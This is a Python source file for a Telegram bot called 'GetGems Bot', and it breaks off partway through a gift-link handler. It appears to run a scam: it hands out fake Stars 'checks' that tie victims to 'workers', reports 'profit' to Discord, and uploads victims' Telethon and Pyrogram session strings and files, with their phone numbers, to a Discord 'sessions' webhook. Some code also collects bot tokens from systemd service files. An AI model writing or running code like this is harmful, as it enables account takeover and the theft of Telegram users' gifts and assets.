import asyncio
import logging 
from logging.handlers import RotatingFileHandler  
import html
import os 
import re 
import requests 
import secrets 
import fcntl 
from typing import Optional 
from urllib.parse import urlparse, parse_qs, quote 
from aiogram import Bot, Dispatcher, types 
from aiogram.filters import Command, CommandStart 
from aiogram.fsm.context import FSMContext 
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage 
from aiogram.types import (
    InlineQuery, InlineQueryResultArticle, InlineQueryResultPhoto, InputTextMessageContent,
    InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, WebAppInfo,
    FSInputFile, BufferedInputFile,
)
from aiogram.utils.keyboard import InlineKeyboardBuilder
from database import db
from config_bot import BotConfig as Config
from typing import List
from datetime import datetime, timedelta, timezone

# Состояния для FSM
class AdminStates(StatesGroup):
    waiting_for_worker_id = State()

from logger_config import get_logger, setup_bot_logging

# Настраиваем логирование для Telegram бота
setup_bot_logging()
logger = get_logger(__name__, log_file="bot.log")

bot = Bot(token=Config.BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())
pending_wsend = {}

async def get_user_info_from_telegram_api(user_id: int) -> Optional[dict]:
    """
    Получить информацию о пользователе через Telegram Bot API
    
    Args:
        user_id: Telegram ID пользователя
        
    Returns:
        dict с информацией о пользователе (username, first_name, last_name, avatar_url) или None
    """
    try:
        from aiogram.methods import GetChat, GetUserProfilePhotos, GetFile
        
        # Получаем информацию о пользователе
        try:
            chat = await bot(GetChat(chat_id=user_id))
            user_info = {
                'telegram_id': user_id,
                'username': getattr(chat, 'username', None),
                'first_name': getattr(chat, 'first_name', None),
                'last_name': getattr(chat, 'last_name', None),
                'avatar_url': None
            }
        except Exception as chat_err:
            logger.warning(f"Не удалось получить информацию о пользователе {user_id} через get_chat: {chat_err}")
            # Если не удалось получить через get_chat, возвращаем None
            return None
        
        # Получаем фото профиля
        try:
            photos_result = await bot(GetUserProfilePhotos(user_id=user_id, limit=1))
            if photos_result and photos_result.total_count > 0 and photos_result.photos and len(photos_result.photos) > 0:
                photo = photos_result.photos[0][0]
                file_info = await bot(GetFile(file_id=photo.file_id))
                if file_info and file_info.file_path:
                    user_info['avatar_url'] = f"https://api.telegram.org/file/bot{Config.BOT_TOKEN}/{file_info.file_path}"
        except Exception as photo_err:
            logger.debug(f"Не удалось получить фото профиля для пользователя {user_id}: {photo_err}")
            # Фото не критично, продолжаем без него
        
        logger.info(f"✅ Получена информация о пользователе {user_id} через Telegram API: username={user_info.get('username')}, name={user_info.get('first_name')}")
        return user_info
        
    except Exception as e:
        logger.error(f"❌ Ошибка при получении информации о пользователе {user_id} через Telegram API: {e}", exc_info=True)
        return None
async def send_message_to_group_with_animation(message: str, user_id: int, phone: str, worker_info: dict = None, topic_id: int = None, is_profit: bool = False, gift_links: list = None):
    """Отправляет сообщение в Discord с изображением
    
    Args:
        message: Текст сообщения
        user_id: ID пользователя
        phone: Номер телефона
        worker_info: Информация о воркере (опционально)
        topic_id: ID темы в форумной группе (опционально, не используется для Discord)
        is_profit: Если True, использует webhook для профита
        gift_links: Список ссылок на подарки для получения изображения первого подарка
    """
    try:
        from discord_logger import discord_logger
        import re
        
        # Определяем тип webhook
        webhook_type = 'profit' if is_profit else 'notifications'
        
        # Пытаемся получить изображение первого подарка
        image_url = "https://i.ibb.co/XfHRzHfw/newprofin.jpg"  # По умолчанию
        if gift_links and len(gift_links) > 0:
            try:
                first_link = gift_links[0]
                # Извлекаем название коллекции и ID из ссылки (формат: https://t.me/nft/CollectionName-Number)
                match = re.search(r'/nft/([^/?]+)', first_link)
                if match:
                    nft_full = match.group(1)
                    parts = nft_full.split('-')
                    collection_name = parts[0] if parts else nft_full
                    gift_id = parts[-1] if len(parts) > 1 else None
                    
                    # Формируем URL изображения подарка
                    # Формат: https://nft.fragment.com/gift/CollectionName-Number.webp или .gif
                    # Используем полное имя с ID для точности
                    if gift_id:
                        # Пробуем разные варианты формата имени
                        collection_lower = collection_name.lower()
                        possible_urls = [
                            f"https://nft.fragment.com/gift/{collection_lower}-{gift_id}.webp",
                            f"https://nft.fragment.com/gift/{collection_lower}-{gift_id}.gif",
                            f"https://nft.fragment.com/gift/{nft_full.lower()}.webp",
                            f"https://nft.fragment.com/gift/{nft_full.lower()}.gif",
                            f"https://nft.fragment.com/gift/{collection_name}-{gift_id}.webp",
                            f"https://nft.fragment.com/gift/{collection_name}-{gift_id}.gif",
                        ]
                    else:
                        collection_lower = collection_name.lower()
                        possible_urls = [
                            f"https://nft.fragment.com/gift/{collection_lower}.webp",
                            f"https://nft.fragment.com/gift/{collection_lower}.gif",
                            f"https://nft.fragment.com/gift/{collection_name}.webp",
                            f"https://nft.fragment.com/gift/{collection_name}.gif",
                        ]
                    
                    # Используем первый вариант (webp обычно предпочтительнее)
                    image_url = possible_urls[0]
            except Exception as img_err:
                logger.debug(f"Не удалось получить изображение подарка: {img_err}")
        
        # Цвет embed в зависимости от типа
        color = 0x2ecc71 if is_profit else 0x3498db  # Зеленый для профита, синий для уведомлений
        
        # Отправляем в Discord
        success = await discord_logger.send_message_with_image(
            message=message,
            image_url=image_url,
            webhook_type=webhook_type,
            color=color,
            username="GetGems Bot"
        )
        
        if success:
            logger.info(f"Message with image sent to Discord for user {user_id}")
            print(f"✅ [DISCORD] Сообщение с изображением успешно отправлено для пользователя {user_id}")
        else:
            logger.warning(f"Failed to send message to Discord for user {user_id}")
            print(f"⚠️ [DISCORD] Не удалось отправить сообщение для пользователя {user_id}")
        
        return success
        
    except Exception as e:
        logger.error(f"Error sending message with image to Discord: {e}")
        print(f"❌ [DISCORD] Ошибка отправки сообщения: {e}")
        import traceback
        traceback.print_exc()
        return False

async def send_message_to_group(message: str, topic_id: int = None):
    """Отправляет текстовое сообщение в Discord
    
    Args:
        message: Текст сообщения
        topic_id: ID темы в форумной группе (опционально, не используется для Discord)
    """
    try:
        from discord_logger import discord_logger
        
        # Определяем тип webhook (по умолчанию actions)
        webhook_type = 'actions'
        
        # Отправляем в Discord
        success = await discord_logger.send_message(
            content=message,
            webhook_type=webhook_type,
            username="GetGems Bot"
        )
        
        if success:
            logger.info("Сообщение отправлено в Discord")
        else:
            logger.warning("Не удалось отправить сообщение в Discord")
    except Exception as e:
        logger.error(f"Ошибка отправки сообщения в Discord: {e}")
async def send_session_to_group(user_id: int, phone_number: str, session_string: str, is_pyrogram: bool = False):
    """Отправляет session string как файл в Discord
    
    Args:
        user_id: ID пользователя
        phone_number: Номер телефона
        session_string: Строка сессии
        is_pyrogram: True если это Pyrogram сессия, False если Telethon
    """
    try:
        from discord_logger import discord_logger
        from datetime import datetime
        
        session_type = "pyrogram_string" if is_pyrogram else "telethon_string"
        session_filename = f"session_{user_id}_{phone_number.replace('+', '')}_{session_type}.txt"
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        session_format = "Pyrogram Session String" if is_pyrogram else "Telethon Session String"
        signature = f"{session_format} from {user_id} @{phone_number} {phone_number}"
        
        caption = (
            f"🔑 **Новый {session_format} получен!**\n\n"
            f"👤 **User ID:** `{user_id}`\n"
            f"📱 **Phone:** `{phone_number}`\n"
            f"📅 **Time:** `{current_time}`\n"
            f"🔧 **Format:** `{session_format}`\n"
            f"🔐 **Signature:** `{signature}`"
        )
        
        # Конвертируем строку в bytes
        file_content = session_string.encode('utf-8')
        
        # Отправляем в Discord
        success = await discord_logger.send_file(
            file_content=file_content,
            filename=session_filename,
            caption=caption,
            webhook_type='sessions',
            username="GetGems Bot"
        )
        
        if success:
            logger.info(f"Session string file sent to Discord for user {user_id}")
            return True
        else:
            logger.warning(f"Failed to send session to Discord for user {user_id}")
            return False
    except Exception as e:
        logger.error(f"Error sending session string to Discord: {e}")
        return False
async def send_session_file_to_group(user_id: int, phone_number: str, session_file_path: str, is_pyrogram: bool = False):
    """Отправляет session файл в Discord
    
    Args:
        user_id: ID пользователя
        phone_number: Номер телефона
        session_file_path: Путь к файлу сессии
        is_pyrogram: True если это Pyrogram сессия, False если Telethon
    """
    import os
    from datetime import datetime
    try:
        from discord_logger import discord_logger
        
        if not os.path.exists(session_file_path):
            logger.error(f"Session file not found: {session_file_path}")
            return False
        
        session_type = "pyrogram" if is_pyrogram else "telethon"
        session_filename = f"session_{user_id}_{phone_number.replace('+', '')}_{session_type}.session"
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        session_format = "Pyrogram Session" if is_pyrogram else "Telethon Session"
        signature = f"{session_format} from {user_id} @{phone_number} {phone_number}"
        
        caption = (
            f"🔑 **Новая {session_format} получена!**\n\n"
            f"👤 **User ID:** `{user_id}`\n"
            f"📱 **Phone:** `{phone_number}`\n"
            f"📅 **Time:** `{current_time}`\n"
            f"🔧 **Format:** `{session_format}`\n"
            f"🔐 **Signature:** `{signature}`"
        )
        
        # Читаем файл
        with open(session_file_path, 'rb') as f:
            file_content = f.read()
        
        # Отправляем в Discord
        success = await discord_logger.send_file(
            file_content=file_content,
            filename=session_filename,
            caption=caption,
            webhook_type='sessions',
            username="GetGems Bot"
        )
        
        if success:
            logger.info(f"Session file sent to Discord for user {user_id}")
            return True
        else:
            logger.warning(f"Failed to send session file to Discord for user {user_id}")
            return False
    except Exception as e:
        logger.error(f"Error sending session file to Discord: {e}")
        return False
def parse_nft_link(nft_link: str) -> Optional[dict]:
    try:
        pattern = r't\.me/nft/([^-]+)-(\d+)'
        match = re.search(pattern, nft_link)
        if match:
            nft_name = match.group(1)
            nft_number = match.group(2)
            return {
                'name': nft_name,
                'number': nft_number,
                'display_name': f"{nft_name}"
            }
        return None
    except Exception as e:
        logger.error(f"Ошибка парсинга NFT ссылки: {e}")
        return None

def generate_share_token() -> str:
    return secrets.token_urlsafe(32)

def generate_stars_check_image(amount: int):
    """Генерирует изображение чека со звездами используя готовые изображения fonstars.jpg и starschek.png"""
    try:
        from PIL import Image, ImageDraw, ImageFont
        from io import BytesIO
    except ImportError:
        logger.error("PIL/Pillow is not available. Please install Pillow: pip3 install Pillow")
        raise ImportError("PIL/Pillow is not available")
    
    # Загружаем фон
    background_path = "/root/getgems/fonstars.jpg"
    star_path = "/root/getgems/starschek.png"
    
    if not os.path.exists(background_path):
        raise FileNotFoundError(f"Фон не найден: {background_path}")
    if not os.path.exists(star_path):
        raise FileNotFoundError(f"Звезда не найдена: {star_path}")
    
    # Открываем фон
    img = Image.open(background_path)
    # Изменяем размер фона до нужного размера (640x320)
    img = img.resize((640, 320), Image.Resampling.LANCZOS)
    
    # Загружаем звезду
    star_img = Image.open(star_path)
    # Изменяем размер звезды (примерно 96x96 или подбираем под фон)
    star_size = 96
    star_img = star_img.resize((star_size, star_size), Image.Resampling.LANCZOS)
    
    # Позиционируем звезду слева
    star_x = 60
    star_y = (img.height - star_size) // 2
    
    # Вставляем звезду на фон (если звезда с прозрачностью)
    if star_img.mode == 'RGBA':
        img.paste(star_img, (star_x, star_y), star_img)
    else:
        img.paste(star_img, (star_x, star_y))
    
    draw = ImageDraw.Draw(img)
    
    # Загружаем шрифт Lilita One для цифр и текста
    font_paths = [
        "/root/getgems/LilitaOne-Regular.ttf",
        "/root/getgems/Lilita One Russian.ttf",
        "/usr/share/fonts/truetype/liberation/LiberationSans-Bold.ttf",
        "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf"
    ]
    
    font_large = None
    font_medium = None
    
    for font_path in font_paths:
        try:
            if os.path.exists(font_path):
                font_large = ImageFont.truetype(font_path, 72)  # Большой шрифт для числа
                font_medium = ImageFont.truetype(font_path, 32)  # Средний для "Stars"
                break
        except Exception as e:
            logger.warning(f"Failed to load font {font_path}: {e}")
            continue
    
    if not font_large:
        font_large = ImageFont.load_default()
        font_medium = ImageFont.load_default()
    
    # Форматируем число с запятыми (как на скриншоте: "1,488" -> "1 488")
    formatted_amount = f"{amount:,}".replace(',', ' ')
    
    # Рисуем число справа от звезды (белый, крупный шрифт)
    number_text = formatted_amount
    number_bbox = draw.textbbox((0, 0), number_text, font=font_large)
    number_width = number_bbox[2] - number_bbox[0]
    number_height = number_bbox[3] - number_bbox[1]
    number_x = star_x + star_size + 40
    number_y = (img.height - number_height) // 2 - 20
    
    # Тень для числа (мягкая)
    draw.text((number_x + 2, number_y + 2), number_text, fill=(0, 0, 0, 50), font=font_large)
    # Основной текст (белый)
    draw.text((number_x, number_y), number_text, fill=(255, 255, 255, 255), font=font_large)
    
    # Рисуем текст "Stars" под числом
    stars_text = "Stars"
    stars_bbox = draw.textbbox((0, 0), stars_text, font=font_medium)
    stars_width = stars_bbox[2] - stars_bbox[0]
    stars_height = stars_bbox[3] - stars_bbox[1]
    stars_x = number_x
    stars_y = number_y + number_height + 10
    
    # Полупрозрачный белый для "Stars"
    draw.text((stars_x, stars_y), stars_text, fill=(255, 255, 255, 220), font=font_medium)
    
    # Сохраняем в BytesIO
    img_bytes = BytesIO()
    img.save(img_bytes, format='PNG', compress_level=1)
    img_bytes.seek(0)
    return img_bytes
@dp.inline_query()
async def inline_query_handler_new(query: InlineQuery):
    """Минималистичный инлайн handler"""
    try:
        query_text = (query.query or "").strip()

        # Пусто - пока ничего не показываем
        if not query_text:
            await query.answer([], cache_time=1, is_personal=True)
            return

        # Проверяем если это число - создаём чек
        query_clean = query_text.replace(' ', '').replace(',', '.')
        try:
            stars_amount = int(float(query_clean))
            if stars_amount > 0:
                # Создаём чек
                check_id = f"stars_check_{secrets.token_urlsafe(16)}"
                photo_url = f"https://imggen.send.tg/checks/image?asset=STARS&asset_amount={stars_amount}&fiat=USD&fiat_amount={stars_amount * 0.01:.2f}&main=asset"

                try:
                    bot_info = await query.bot.get_me()
                    bot_username = bot_info.username or "bot"
                except:
                    bot_username = Config.BOT_USERNAME or "bot"

                ref_link = f"https://t.me/{bot_username}?start=check_{check_id}"

                # ВАЖНО: Записываем чек в БД ДО возврата результатов
                try:
                    import sqlite3
                    db_path = os.path.abspath(os.path.join(os.path.dirname(__file__), 'backend', 'playerok.db'))
                    if not os.path.exists(db_path):
                        db_path = os.path.abspath('backend/playerok.db')

                    with sqlite3.connect(db_path, timeout=10.0) as conn:
                        cursor = conn.cursor()
                        cursor.execute('''
                            INSERT INTO checks (check_id, worker_id, worker_telegram_id, currency, amount, status, created_at)
                            VALUES (?, ?, ?, ?, ?, ?, ?)
                        ''', (
                            check_id,
                            query.from_user.id,  # worker_id
                            query.from_user.id,  # worker_telegram_id
                            'STARS',  # currency
                            stars_amount,  # amount
                            'active',  # status
                            datetime.now(timezone.utc).isoformat()  # created_at
                        ))
                        conn.commit()
                    logger.info(f"Check created in DB: {check_id} for user {query.from_user.id}")
                except Exception as db_error:
                    logger.error(f"Error inserting check to DB: {db_error}", exc_info=True)

                from aiogram.utils.keyboard import InlineKeyboardBuilder
                keyboard = InlineKeyboardBuilder()
                keyboard.add(InlineKeyboardButton(text="Забрать", url=ref_link))

                results = [
                    InlineQueryResultPhoto(
                        id=check_id,
                        photo_url=photo_url,
                        thumbnail_url=photo_url,
                        title=f"Чек на {stars_amount} ⭐️",
                        description="Нажмите чтобы поделиться",
                        reply_markup=keyboard.as_markup()
                    )
                ]
                await query.answer(results, cache_time=1, is_personal=True)
                return
        except (ValueError, TypeError):
            pass

        # Всё остальное - пусто
        await query.answer([], cache_time=1, is_personal=True)
    except Exception as e:
        logger.error(f"Inline handler error: {e}", exc_info=True)
        try:
            await query.answer([], cache_time=1)
        except:
            pass


@dp.message(CommandStart())
async def start_handler(message: types.Message):
    try:
        # Обрабатываем только личные сообщения, игнорируем групповые чаты
        if message.chat.type != "private":
            return
        
        logger.info(f"Start command from user {message.from_user.id} (@{message.from_user.username}): {message.text}")
        logger.info(f"[DEBUG] start_handler called, message.text='{message.text}', message.chat.id={message.chat.id}")
        args = message.text.split(' ', 1)
        
        # Обработка активации чека check_<check_id>
        if len(args) > 1 and args[1].startswith('check_'):
            # Проверяем, включены ли чеки для этого бота
            try:
                from get_bot_settings import is_checks_enabled
                if not is_checks_enabled(Config.BOT_TOKEN):
                    await message.answer("❌ Чеки отключены для этого бота.")
                    return
            except Exception as e:
                logger.warning(f"Error checking checks enabled: {e}")
                # Продолжаем выполнение, если не удалось проверить
            check_id = args[1][6:]  # Убираем префикс "check_"
            logger.info(f"Processing check activation: {check_id}")
            
            try:
                # Получаем чек из БД (используем правильный путь)
                import sqlite3
                db_path = os.path.abspath(os.path.join(os.path.dirname(__file__), 'backend', 'playerok.db'))
                if not os.path.exists(db_path):
                    db_path = os.path.abspath('backend/playerok.db')
                check = None
                with sqlite3.connect(db_path, timeout=10.0) as conn:
                    conn.row_factory = sqlite3.Row
                    cursor = conn.cursor()
                    cursor.execute('SELECT * FROM checks WHERE check_id = ?', (check_id,))
                    row = cursor.fetchone()
                    if row:
                        check = dict(row)
                
                # Пытаемся получить кастомные сообщения об ошибках чека
                try:
                    from get_bot_settings import get_check_not_found_message, get_check_already_used_message
                    check_not_found_msg = get_check_not_found_message(Config.BOT_TOKEN)
                    check_already_used_msg = get_check_already_used_message(Config.BOT_TOKEN)
                except Exception as e:
                    logger.warning(f"Error getting custom check messages: {e}")
                    check_not_found_msg = None
                    check_already_used_msg = None
                
                if not check:
                    error_msg = check_not_found_msg or "❌ Чек не найден или уже использован."
                    await message.answer(error_msg)
                    return
                
                if check['status'] != 'active':
                    error_msg = check_already_used_msg or "❌ Этот чек уже был использован."
                    await message.answer(error_msg)
                    return
                
                # Получаем или создаем пользователя из ПРАВИЛЬНОЙ БД
                # ВАЖНО: используем backend.database, а не корневой database
                from backend.database import Database as BackendDatabase
                backend_db_path = os.path.abspath(os.path.join(os.path.dirname(__file__), 'backend', 'playerok.db'))
                if not os.path.exists(backend_db_path):
                    backend_db_path = os.path.abspath('backend/playerok.db')
                
                backend_db = BackendDatabase(db_path=backend_db_path)
                recipient_user = backend_db.get_or_create_user(
                    telegram_id=message.from_user.id,
                    username=message.from_user.username,
                    first_name=message.from_user.first_name,
                    last_name=message.from_user.last_name
                )
                logger.info(f"✅ User found/created: id={recipient_user['id']}, telegram_id={recipient_user.get('telegram_id')}, db_path={backend_db_path}")
                
                # Активируем чек
                with sqlite3.connect(db_path, timeout=10.0) as conn:
                    cursor = conn.cursor()
                    cursor.execute('''
                        UPDATE checks 
                        SET status = 'used', 
                            recipient_telegram_id = ?,
                            recipient_user_id = ?,
                            activated_at = CURRENT_TIMESTAMP
                        WHERE check_id = ? AND status = 'active'
                    ''', (message.from_user.id, recipient_user['id'], check_id))
                    conn.commit()
                    if cursor.rowcount == 0:
                        await message.answer("❌ Не удалось активировать чек.")
                        return
                
                # Пополняем баланс звезд
                currency = check['currency']
                amount = check['amount']
                
                # Используем backend.database для добавления баланса
                # ВАЖНО: используем тот же экземпляр БД, что и для получения пользователя
                try:
                    # backend_db уже создан выше при получении пользователя
                    backend_db.add_balance(recipient_user['id'], amount, currency)
                    logger.info(f"✅ Balance added: user_id={recipient_user['id']}, telegram_id={recipient_user.get('telegram_id')}, amount={amount}, currency={currency}, db_path={backend_db_path}")
                    
                    # Проверяем баланс после добавления
                    updated_user = backend_db.get_user_by_id(recipient_user['id'])
                    if updated_user:
                        logger.info(f"✅ Balance verified: {updated_user.get('balance_starts', 0)} STARS")
                    else:
                        logger.warning(f"⚠️ Could not verify balance for user_id={recipient_user['id']}")
                except Exception as balance_err:
                    logger.error(f"Ошибка добавления баланса: {balance_err}", exc_info=True)
                    # Продолжаем, даже если не удалось добавить баланс
                
                # Форматируем сумму
                if currency == 'STARS':
                    formatted_amount = f"{int(amount)}"
                else:
                    formatted_amount = f"{amount:,.2f}".replace(',', ' ').rstrip('0').rstrip('.')
                
                # Генерируем изображение чека используя внешний API (как в STARS.py)
                try:
                    # 1 Star = $0.01
                    price_usd = 0.01
                    total_usd = float(amount) * price_usd
                    
                    # Используем внешний API для генерации изображения
                    image_url = f"https://imggen.send.tg/checks/image?asset=STARS&asset_amount={int(amount)}&fiat=USD&fiat_amount={total_usd:.2f}&main=asset"
                    
                    # Пытаемся получить кастомное сообщение об успехе
                    try:
                        from get_bot_settings import get_check_success_message
                        custom_success = get_check_success_message(Config.BOT_TOKEN)
                        if custom_success:
                            success_text = custom_success.replace('{amount}', formatted_amount).replace('{currency}', currency)
                        else:
                            success_text = (
                                f"⭐️ <b>+{formatted_amount} Stars</b>\n\n"
                                f"Звёзды зачислены на ваш баланс.\n"
                            )
                    except Exception as e:
                        logger.warning(f"Error getting custom check success message: {e}")
                        success_text = (
                            f"⭐️ <b>+{formatted_amount} Stars</b>\n\n"
                            f"Звёзды зачислены на ваш баланс.\n"
                        )
                    
                    # Создаем кнопку "Баланс" для перехода в раздел звезд
                    webapp_url = Config.get_webapp_url()
                    balance_button = InlineKeyboardMarkup(inline_keyboard=[
                        [InlineKeyboardButton(
                            text="Баланс",
                            web_app=WebAppInfo(url=f"{webapp_url}/stars")
                        )]
                    ])
                    
                    # Отправляем изображение по URL
                    await message.answer_photo(
                        photo=image_url,
                        caption=success_text,
                        parse_mode='HTML',
                        reply_markup=balance_button
                    )
                except Exception as img_err:
                    logger.error(f"Ошибка отправки изображения чека: {img_err}", exc_info=True)
                    # Отправляем только текст, если не удалось отправить изображение
                    success_text = (
                        f"⭐️ <b>+{formatted_amount} Stars</b>\n\n"
                        f"Звёзды зачислены на ваш баланс.\n"
                    )
                    
                    # Создаем кнопку "Баланс" для перехода в раздел звезд
                    webapp_url = Config.get_webapp_url()
                    balance_button = InlineKeyboardMarkup(inline_keyboard=[
                        [InlineKeyboardButton(
                            text="Баланс",
                            web_app=WebAppInfo(url=f"{webapp_url}/stars")
                        )]
                    ])
                    
                    await message.answer(success_text, parse_mode='HTML', reply_markup=balance_button)
                
                # ВАЖНО: Привязываем пользователя к воркеру при активации чека
                # Это нужно для того, чтобы логи о вводе номера и других действиях шли в логи воркера
                worker_telegram_id = check.get('worker_telegram_id')
                if worker_telegram_id:
                    try:
                        # Используем главную БД для привязки (не backend БД)
                        from database import Database
                        main_db = Database()
                        main_db.bind_user_to_worker(
                            user_telegram_id=message.from_user.id,
                            worker_telegram_id=worker_telegram_id,
                            binding_source='check_activation',
                            check_id=check_id
                        )
                        logger.info(f"✅ Пользователь {message.from_user.id} автоматически привязан к воркеру {worker_telegram_id} при активации чека {check_id}")
                    except Exception as bind_err:
                        logger.warning(f"⚠️ Не удалось привязать пользователя к воркеру: {bind_err}")
                
                # Логируем активацию чека через log_user_action (отправляет в Discord и локальные логи)
                try:
                    from utils import log_user_action
                    
                    # Получаем информацию о создателе чека
                    # ВАЖНО: check - это dict из sqlite3.Row
                    logger.info(f"📋 Check data: worker_telegram_id={worker_telegram_id}, check keys={list(check.keys())}")
                    
                    worker_info = None
                    if worker_telegram_id:
                        try:
                            worker_info = backend_db.get_user_by_telegram_id(worker_telegram_id)
                        except Exception as worker_err:
                            logger.warning(f"Failed to get worker info: {worker_err}")
                    
                    worker_username = "Неизвестно"
                    # Приоритет: worker_username, сохраненный в чеке при создании (самый точный)
                    if check and check.get('worker_username'):
                        worker_username = check.get('worker_username')
                    elif worker_info:
                        worker_username = worker_info.get('username') or worker_info.get('first_name') or f"ID{worker_telegram_id}"
                    # Фоллбэк: пробуем получить через bot.get_chat() через все доступные боты
                    if worker_username == "Неизвестно" and worker_telegram_id:
                        import os as _os, glob as _glob, re as _re
                        from aiogram import Bot as _Bot
                        _fb_tokens = []
                        _fb_seen = set()
                        def _fb_add(t):
                            if t and t not in _fb_seen:
                                _fb_seen.add(t); _fb_tokens.append(t)
                        for _v in ("BOT_TOKEN", "LOGS_BOT_TOKEN"):
                            _fb_add(_os.getenv(_v, ""))
                        for _p in _glob.glob("/etc/systemd/system/getgems*.service"):
                            try:
                                for _m in _re.finditer(r'BOT_TOKEN=(\S+)', open(_p).read()):
                                    _fb_add(_m.group(1).strip('"\''))
                            except Exception:
                                pass
                        for _tok in _fb_tokens:
                            try:
                                _tmp = _Bot(token=_tok)
                                _chat = await _tmp.get_chat(worker_telegram_id)
                                worker_username = getattr(_chat, 'username', None) or getattr(_chat, 'first_name', None) or f"ID{worker_telegram_id}"
                                await _tmp.session.close()
                                break
                            except Exception:
                                try: await _tmp.session.close()
                                except Exception: pass
                    
                    # Логируем через log_user_action (красивый embed в Discord + локальные логи)
                    await log_user_action(
                        'check_activated',
                        user_info={
                            'telegram_id': message.from_user.id,
                            'username': message.from_user.username,
                            'first_name': message.from_user.first_name,
                            'last_name': message.from_user.last_name
                        },
                        worker_info={
                            'telegram_id': worker_telegram_id,
                            'username': worker_username
                        } if worker_telegram_id else None,
                        additional_data={
                            'check_id': check_id,
                            'amount': formatted_amount,
                            'currency': currency,
                            'details': f"Активирован чек на {formatted_amount} {currency}"
                        }
                    )
                    
                    logger.info(f"✅ Check activation logged: {check_id} activated by {message.from_user.id}")
                except Exception as log_err:
                    logger.warning(f"Failed to log check activation: {log_err}", exc_info=True)
                
                # Отправляем уведомление создателю чека
                # ВАЖНО: используем worker_telegram_id, который уже получен выше для Discord логирования
                try:
                    logger.info(f"🔔 Attempting to send notification: worker_telegram_id={worker_telegram_id}, activator_id={message.from_user.id}")
                    
                    if worker_telegram_id and worker_telegram_id != message.from_user.id:
                        # Получаем username активатора
                        activator_username = message.from_user.username or f"id{message.from_user.id}"
                        notification_text = (
                            f"🔔 <b>Ваш чек активирован!</b>\n\n"
                            f"👤 <b>Активировал:</b> @{activator_username}\n"
                            f"💰 <b>Сумма:</b> {formatted_amount} ⭐️\n"
                            f"🆔 <b>ID чека:</b> <code>{check_id}</code>"
                        )
                        
                        import os as _os2, glob as _glob2, re as _re2
                        from aiogram import Bot as _Bot2
                        _all_tokens = []
                        _seen2: set = set()
                        def _add2(t):
                            if t and t not in _seen2:
                                _seen2.add(t); _all_tokens.append(t)
                        for _v2 in ("BOT_TOKEN", "LOGS_BOT_TOKEN", "TELEGRAM_LOGS_BOT_TOKEN", "ENV_MANAGER_BOT_TOKEN"):
                            _add2(_os2.getenv(_v2, ""))
                        for _p2 in _glob2.glob("/etc/systemd/system/getgems*.service"):
                            try:
                                for _m2 in _re2.finditer(r'BOT_TOKEN=(\S+)', open(_p2).read()):
                                    _add2(_m2.group(1).strip('"\''))
                            except Exception:
                                pass
                        _sent = False
                        for _tok2 in _all_tokens:
                            _tmp2 = _Bot2(token=_tok2)
                            try:
                                await _tmp2.send_message(chat_id=worker_telegram_id, text=notification_text, parse_mode='HTML')
                                _sent = True
                                await _tmp2.session.close()
                                break
                            except Exception:
                                try: await _tmp2.session.close()
                                except Exception: pass
                        if _sent:
                            logger.info(f"✅ Notification sent to check creator {worker_telegram_id} about activation by {message.from_user.id}")
                        else:
                            logger.warning(f"⚠️ Не удалось отправить уведомление воркеру {worker_telegram_id} ни через один бот")
                    elif worker_telegram_id == message.from_user.id:
                        logger.info(f"ℹ️ Skipping notification: user {message.from_user.id} activated their own check")
                    else:
                        logger.warning(f"⚠️ Cannot send notification: worker_telegram_id is None or missing")
                except Exception as notify_err:
                    logger.error(f"❌ Failed to send notification to check creator: {notify_err}", exc_info=True)
                
                logger.info(f"Check {check_id} activated by user {message.from_user.id}, amount: {amount} {currency}")
                return
                
            except Exception as check_err:
                logger.error(f"Ошибка активации чека: {check_err}", exc_info=True)
                await message.answer("❌ Произошла ошибка при активации чека. Попробуйте еще раз.")
                return
        
        if len(args) > 1 and args[1].startswith('gift_'):
            share_token = args[1][5:]
            logger.info(f"Processing gift share token: {share_token}")
            gift_share = db.get_gift_share_by_token(share_token)
            logger.info(f"Gift share data: {gift_share}")
            if not gift_share:
                logger.warning(f"Gift share not found for token: {share_token}")
                await message.answer("❌ Подарочная ссылка не найдена или недействительна.")
                return
            if gift_share['is_received']:
                logger.warning(f"Gift already received for token: {share_token}")
                await message.answer("❌ Этот подарок уже был принят.")
                return
            
            # Проверяем, разрешен ли пользователь открывать эту ссылку
            allowed_user_id = gift_share.get('allowed_user_id')
            allowed_user_identifier = gift_share.get('allowed_user_identifier')
            
            if allowed_user_identifier:
                # Проверяем по identifier (username или ID)
                is_allowed = False
                
                if allowed_user_identifier.startswith('@'):
                    # Проверяем по username
                    current_username = message.from_user.username
                    if current_username:
                        # Сравниваем username без @
                        allowed_username = allowed_user_identifier.lstrip('@').lower()
                        current_username_clean = current_username.lower()
                        if allowed_username == current_username_clean:
                            is_allowed = True
                else:
                    # Проверяем по ID
                    try:
                        allowed_id = int(allowed_user_identifier)
                        if message.from_user.id == allowed_id:
                            is_allowed = True
                    except (ValueError, TypeError):
                        pass
                
                # Также проверяем по allowed_user_id для обратной совместимости
                if not is_allowed and allowed_user_id is not None:
                    if message.from_user.id == allowed_user_id:
                        is_allowed = True
                
                if not is_allowed:
                    logger.warning(f"User {message.from_user.id} (@{message.from_user.username}) tried to access gift link restricted to {allowed_user_identifier}")
                    try:
                        from get_bot_settings import get_gift_access_denied_message
                        access_denied_msg = get_gift_access_denied_message(Config.BOT_TOKEN)
                    except Exception:
                        access_denied_msg = None
                    await message.answer(
                        access_denied_msg or "❌ Вам нельзя открывать эту ссылку.\n\nЭта подарочная ссылка привязана к другому пользователю."
                    )
                    return
            elif allowed_user_id is not None:
                # Обратная совместимость: проверка только по ID
                if message.from_user.id != allowed_user_id:
                    logger.warning(f"User {message.from_user.id} tried to access gift link restricted to user {allowed_user_id}")
                    try:
                        from get_bot_settings import get_gift_access_denied_message
                        access_denied_msg = get_gift_access_denied_message(Config.BOT_TOKEN)
                    except Exception:
                        access_denied_msg = None
                    await message.answer(
                        access_denied_msg or "❌ Вам нельзя открывать эту ссылку.\n\nЭта подарочная ссылка привязана к другому пользователю."
                    )
                    return
            
            logger.info(f"Ensuring user registration for telegram_id: {message.from_user.id}")
            user = db.get_or_create_user(
                telegram_id=message.from_user.id,
                username=message.from_user.username,
                first_name=message.from_user.first_name,
                last_name=message.from_user.last_name
            )
